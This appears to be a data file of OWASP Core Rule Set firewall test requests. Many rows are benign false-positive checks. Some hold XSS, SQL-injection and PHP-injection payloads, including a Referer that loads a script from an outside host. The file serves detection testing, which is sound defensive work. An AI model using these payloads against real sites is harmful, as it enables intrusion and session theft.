+PHP	GET	/get	foo=autodescription-site-settings[title_strip_tags]	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=SprintForTheCause	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=printf(foo)	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=A%20loaded%20ghost%20gun%20(unserialized)%20was%20recovered%20in%20the%20car.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=Moreover,%20phpinfo%20can%20potentially%20leak%20sensitive%20configuration%20details%20that%20an%20attacker%20can%20exploit%20to%20gain%20information%20about%20the%20server.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=PaintValdosta	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/is_int	a=1	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=filemtime%28%24foo%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=array_diff	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=ceiling%20height(9ft)	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=preview	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=exploration	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=filemtime%28%24foo%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=mb_stristr	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=openlogfile(foo)	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=preview	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=exploration	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=filemtime%28%24foo%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=zlib_get_coding_type	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=sodium_add_to_recipe(foo)	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=preview	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	a=exploration	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get/eval(		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=eval	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=the%20files%20%28yep%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=RootAndLeafOpenCamera.jpg	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=autodescription-site-settings[title_strip_tags]	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=SprintForTheCause	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=A%20loaded%20ghost%20gun%20(unserialized)%20was%20recovered%20in%20the%20car.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=Moreover,%20phpinfo%20can%20potentially%20leak%20sensitive%20configuration%20details%20that%20an%20attacker%20can%20exploit%20to%20gain%20information%20about%20the%20server.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post/	test=PaintValdosta	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=dl%2f%2afoo%2a%2f%09%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post	foo=xucfirst%28%29	OWASP CRS test agent		gethostbynamE(	User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=xcheckdate%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=symlink%23x%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	foo=checkdate	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%24a%23foo%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%24a%2F%2Ffoo%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%24a%5B%5D%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%24%7B%7D%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%24a%7B%7D%28%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get/test.php	file=lz77://some_file.lz	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%5bACME%5d%3a+this+is%2c+%28another%29+test+%28foo%29bar+or+foo%28bar%29.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%28foo%29bar+or+foo%28bar%29+or+%5bfoo%5dbar+or+foo%5bbar%5d	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get		OWASP CRS test agent	x=(foo)/(bar)		User-Agent: OWASP CRS test agent Cookie: x=(foo)/(bar)
+PHP	GET	/get		OWASP CRS test agent	x=(/foo)/(/bar)		User-Agent: OWASP CRS test agent Cookie: x=(/foo)/(/bar)
+PHP	GET	/get	search=this+is+a+%22dog%22+%28not+a+cat%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%5bACME%5d%3a+this+is%2c+%28another%29+test+%28foo%29bar+or+foo%28bar%29.	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get	x=%28foo%29bar+or+foo%28bar%29+or+%5bfoo%5dbar+or+foo%5bbar%5d	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/get		OWASP CRS test agent	x=(foo)/(bar)		User-Agent: OWASP CRS test agent Cookie: x=(foo)/(bar)
+PHP	GET	/get		OWASP CRS test agent	x=(/foo)/(/bar)		User-Agent: OWASP CRS test agent Cookie: x=(/foo)/(/bar)
+PHP	GET	/upload		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/upload		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/upload		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/upload		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/upload		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+PHP	POST	/post		OWASP CRS test agent		----------397236876 Content-Disposition: form-data; name="file"; filename="safe_document.txt" Content-Type: text/plain  safe content ----------397236876-- 	User-Agent: OWASP CRS test agent Content-Type: multipart/form-data; boundary=--------397236876
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: http://www.coreruleset.org
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: /demo/xss/xml/vuln.xml.php?input=<script+xmlns="http://www.w3.org/1999/xhtml">setTimeout("top.frame2.location="javascript:(function+()+{var+x+=+document.createElement(\\"script\\");x.src+=+\\"//sdl.me/popup.js?//\\";document.childNodes\\[0\\].appendChild(x);}());"",1000)</script>&//
+XSS	GET	/get	%9cscript+%bcalert(1);%bc/script%9e=value	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	POST	/post	%20%20onab%3d%20=vardata	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	GET	/get		OWASP CRS test agent	FCNEC=[["AKsRol96Mxyk9FqhFojBc6fQqh-bo-s0VYkniISe0wOz3NRAr90HMsu ZQ81FJitWrfPRF09u-aYlhT0PMzLHW-cwgE2c_bmkaerz5Ht3N2y-Tseg5C_ngXVXK2eHiHVfBdx8iAtcRpqNdws_RZwZarM8E0ONvOztHg=="]]		Cookie: FCNEC=[["AKsRol96Mxyk9FqhFojBc6fQqh-bo-s0VYkniISe0wOz3NRAr90HMsu ZQ81FJitWrfPRF09u-aYlhT0PMzLHW-cwgE2c_bmkaerz5Ht3N2y-Tseg5C_ngXVXK2eHiHVfBdx8iAtcRpqNdws_RZwZarM8E0ONvOztHg=="]] User-Agent: OWASP CRS test agent
+XSS	GET	/get	%20%20onthisisaverylongwordthathasmorethanfiftycharactersss%3d%20=vardata	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	GET	/get	sign=VGhhbmtzLCBmb3IgYWxsIHlvdXIgd29yayBzaW5jZSB5ZWFycyBvbiBDUlMuIEh1bQo%2Fonafe%3D	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	POST	/ipn/paypal		PayPal IPN		mc_gross=19.95&protection_eligibility=Eligible&payer_id=TESTBUYER&payment_date=12%3A34%3A56+Jan+25+2026&payment_status=Completed&txn_id=1AB23456CD789012E&transaction_subject=Payment&verify_sign=AFcWxV21C7fd0v3bYYYRCpSSRl31A.8h7mKqR9sT5wN%3D	User-Agent: PayPal IPN
+XSS	POST	/webhook/adyen		OWASP CRS test agent		merchantReference=TEST_ORDER_12345&skinCode=X7hsNDWp&shopperLocale=en_GB&paymentMethod=visa&authResult=AUTHORISED&pspReference=8535296475213845&merchantSig=h5xb3Qm7Yp9Lkd2Wf8Rg4Jv6Tn	User-Agent: OWASP CRS test agent
+XSS	POST	/webhook/braintree		OWASP CRS test agent		bt_signature=MIIGSAIBAzCCBgwGCSqGSIb3DQEHAaCCBf0EggX5MIIF9TCCBfEGCSqonefgh%3Di	User-Agent: OWASP CRS test agent
+XSS	POST	/payment/process		OWASP CRS test agent		grant_type=authorization_code&code=xyz123&access_token=ya29.a0AfH6SMBx7QkVm3TpWz8RiPQzNsK1Dv%3D2DqE3F	User-Agent: OWASP CRS test agent Content-Type: application/x-www-form-urlencoded
+XSS	POST	/checkout		OWASP CRS test agent		order_id=ORD-2026-01-25&confirmation_code=CONF-ABC123XYZ&session_token=sess_1a2b3c4Xm7Yp9Qn5Rt8Wk%3D	User-Agent: OWASP CRS test agent
+XSS	POST	/api/callback		OWASP CRS test agent		signature=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2Xm7YpLk9Qw3Rt8Vf6Jn	User-Agent: OWASP CRS test agent
+XSS	POST	/webhook/payment		OWASP CRS test agent		{"event":"payment.succeeded","data":{"transaction_id":"txn_1ABC2Xm7YpLk9Qw3DEF4","amount":5000,"currency":"USD","signature":"hmac-sha256=5f7g8h9i0j1k2Wm3Rt5Vp9Ys"}}	User-Agent: OWASP CRS test agent Content-Type: application/json
+XSS	POST	/payment/authnet/relay		OWASP CRS test agent		x_response_code=1&x_response_reason_code=1&x_response_reason_text=Approved&x_trans_id=40011019799&x_MD5_Hash=8A7BCF1D2E3F4A5B6C7D8E9Xm3Yp7Wk1F2A	User-Agent: OWASP CRS test agent
+XSS	POST	/payment/callback		OWASP CRS test agent		merchant_id=12345&transaction_hash=aGVsbG93b3JsZA%3D%3D&verification_token=ZXhhbXBsZXRva2VuaGVyZQ%3D%3D&confirmation=Y29uZmlybWF0aW9uY29kZQ%3D%3D	User-Agent: OWASP CRS test agent
+XSS	POST	/payment/applepay		OWASP CRS test agent		{"paymentData":{"version":"EC_v1","data":"encrypted_data_here","signature":"MIAGCSqGSIb3DQonabcdefgh=HIJAoGBAMIIBrTCCA","header":{"ephemeralPublicKey":"MFkwEwYHKoZIzj0CAQYonefghij=k"}}}	User-Agent: OWASP CRS test agent Content-Type: application/json
+XSS	POST	/payment/googlepay		OWASP CRS test agent		{"signature":"MEUCIQDXm7Yp9Lk5Rt8Wf3Jn2Qv6Tn","protocolVersion":"ECv2","signedMessage":"{\"encryptedMessage\":\"Base64Encoded3RandStr1ng\"}"}	User-Agent: OWASP CRS test agent Content-Type: application/json
+XSS	GET	/get		Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36			User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+XSS	GET	/get		Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Electron/23.0.0			User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Electron/23.0.0
+XSS	GET	/get		Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Silk/89.4.7 like Chrome/89.0.4389.72 Safari/537.36			User-Agent: Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Silk/89.4.7 like Chrome/89.0.4389.72 Safari/537.36
+XSS	GET	/get		Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36			User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36
+XSS	GET	/get		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15			User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
+XSS	GET	/get		Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/116.0.1938.72 Mobile/15E148 Safari/605.1.15			User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/116.0.1938.72 Mobile/15E148 Safari/605.1.15
+XSS	GET	/get		Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1			User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1
+XSS	GET	/get		Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15			User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15
+XSS	GET	/get		Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0			User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0
+XSS	GET	/get		Moneroprice/1.0 (+https://example.com/bot)			User-Agent: Moneroprice/1.0 (+https://example.com/bot)
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://example.com/page?version=1.0&action=view
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://shop.example.com/products?version=premium&option=deluxe
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://www.amazon.com/products/electronics
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://docs.example.com/guide#section=introduction
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://app.example.com/dashboard?action=edit&id=123
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://maps.example.com/location?position=center&zoom=10
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://secure.example.com/checkout?session=abc123def456
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://www.example.com/version/v2.0/documentation
+XSS	GET	/get		Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36			User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36
+XSS	GET	/get		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://store.example.com/checkout?addon=premium&option=monthly
+XSS	POST	/post/api/v1/query	q=7XMLNS	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=There's a pattern in the dark background. Here's a video: <a href=\x22https://www.youtube.com/watch?v=	User-Agent: OWASP CRS test agent
+XSS	GET	/get/bar	test=style%3Dcolor%3Ared%3Bbackground%3Awhite	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	GET	/get/bar	test=style%3Dbackground%3Aurl%28http%3A%2F%2Fexample.com%2Fx%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	GET	/get/bar	test=style%3Da%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3Ba%3Ab%3B	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	GET	/get/bar	test=url%28javascript%3Aalert%281%29%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	POST	/post/foo		OWASP CRS test agent		941180-4=-->	User-Agent: OWASP CRS test agent
+XSS	GET	/get/javascript-manual/document.cookie		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xd0\xb0\xd0\xb1\xd0\xb2\xd0\xb3\xd0\xb4\xd0\xb5\xd1\x91\xd0\xb6\xd0\xb7\xd0\xb8\xd0\xb9\xd0\xba\xd0\xbb\xd0\xbc\xd0\xbd\xd0\xbe\xd0\xbf\xd1\x80\xd1\x81\xd1\x82\xd1\x83\xd1\x84\xd1\x85\xd1\x86\xd1\x87\xd1\x88\xd1\x89\xd1\x8a\xd1\x8b\xd1\x8d\xd1\x8e\xd1\x8f	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=de_matten & sitzbez\xc3\x83\xc2\xbcge > fu\xc3\x83\xc2\x9fmatten_mt	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xbc\xbc	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xbe\xbe	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xd0\xbcscript\xd0\xbealert(\xc2\xa2XSS\xc2\xa2)\xd0\xbc/script\xd0	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xd0\xbcscript\xd0\xbealert(\xc2\xa2XSS\xc2\xa2)\xd0/script\xd0\xbe	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xd0\xb0\xd0\xb1\xd0\xb2\xd0\xb3\xd0\xb4\xd0\xb5\xd1\x91\xd0\xb6\xd0\xb7\xd0\xb8\xd0\xb9\xd0\xba\xd0\xbb\xd0\xbc\xd0\xbd\xd0\xbf\xd1\x80\xd1\x81\xd1\x82\xd1\x83\xd1\x84\xd1\x85\xd1\x86\xd1\x87\xd1\x88\xd1\x89\xd1\x8a\xd1\x8b\xd1\x8d\xd1\x8e\xd1\x8f	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+XSS	POST	/post		OWASP CRS test agent		var=\xd0\xb0\xd0\xb1\xd0\xb2\xd0\xb3\xd0\xb4\xd0\xb5\xd1\x91\xd0\xb6\xd0\xb7\xd0\xb8\xd0\xb9\xd0\xba\xd0\xbb\xd0\xbd\xd0\xbe\xd0\xbf\xd1\x80\xd1\x81\xd1\x82\xd1\x83\xd1\x84\xd1\x85\xd1\x86\xd1\x87\xd1\x88\xd1\x89\xd1\x8a\xd1\x8b\xd1\x8d\xd1\x8e\xd1\x8f	Content-Type: application/x-www-form-urlencoded; charset=us-ascii User-Agent: OWASP CRS test agent
+SQL	POST	/post/foo/9'union+all/bar		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post/foo/24+union+all+select+1,2,3+from+aa/bar		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=user'collate%20foo--	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		text=It is highly unlikely this is going to be a false positive	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		text=After calculating the likelihood this should not be matched. 	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=%221%22%20sSOUNDS%20LIKE%20%22SOUNDS%20LIKE%201&other_var=test	User-Agent: OWASP CRS test agent
+SQL	GET	/get	a=11=1	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	a=1=11	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	a=11!=11	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	a=This%20is%20like%20no%20other	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	a=11!=11	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	a=1%20is%20not%201	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		a='1' not regexp '1'	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=Weitere überlieferte Bezeichnungen sind Harsle (1319), Crucesignati in Herslo (1475) und Haßelt (1599).	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=Left (WA, RR), following wood edge south (‘Restrictive Byway’/RB) for ½ mile to Pangfield Farm (564719).	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=One quarter (24%) of people have had an affair and cheated on a partner at some point in their lives, according to results released today.	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=You can choose between front up to maximise space (ideal for art and drawing), left up (for right handed users) and right up (for left handed users).	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=A maximum of the likelihood function occurs at the same parameter-value as a maximum of the logarithm of the likelihood (the "log likelihood"), because the logarithm is an increasing function.	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=Below the rank of species he sometimes recognized taxa of a lower (unnamed) rank ; these have since acquired standardised names such as variety in botany and subspecies in zoology.	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=Grasshopper v1.0 made its eighth, and final, test flight on October 7, 2013, flying to an altitude of convert (0.46 miles) before making its eighth successful VTVL landing.	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=In older texts printed down to c. 1630, v was used in initial position (even when it represented a vowel, e.g. in vt, later printed ut) and u was used elsewhere, e.g. in nouus, later printed novus.	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=The measures of the interior angles of the triangle always add up to 180 degrees (same color to point out they are equal).	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=There are numerous causes of asystole that may be reversible if determined quickly enough, however, survival is very unlikely (~2% if not in a hospital).	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		payload=The script is written from right to left, (Lal 1966) and sometimes follows a boustrophedonic style.	User-Agent: OWASP CRS test agent
+SQL	GET	/BENChmARk(2999/**/999,Md5(/		OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=I%20sleep%20well%21	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		%22%21+Y%0A	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		%60%211%0A	User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent		arg=Die%20%22Union%20von%20Europa%22	User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent		arg=it%20is%20my%20beliif%20%28stemming%20from%20personal%20experience%29%2C%20that	User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent		arg=appUser(sitename,user)	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		searchValue=%22Quote%22%21%20Next%20sentence	User-Agent: OWASP CRS test agent
+SQL	GET	/get	varname=address%3D999%2C%20rue%20d%27Arlon	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/		Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0			User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+SQL	GET	/		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36			User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+SQL	GET	/		Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36			User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36
+SQL	GET	/		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/124.0.0.0 (Edition developer)			User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/124.0.0.0 (Edition developer)
+SQL	GET	/		Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 OPR/92.0.0.0			User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 OPR/92.0.0.0
+SQL	GET	/		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0			User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0
+SQL	GET	/		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15			User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15
+SQL	GET	/		Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1			User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1
+SQL	GET	/		Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)			User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+SQL	GET	/wp-admin/load-scripts.php	c=0&load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils,zxcvbn-async&ver=6.9.4	OWASP CRS test agent			User-Agent: OWASP CRS test agent
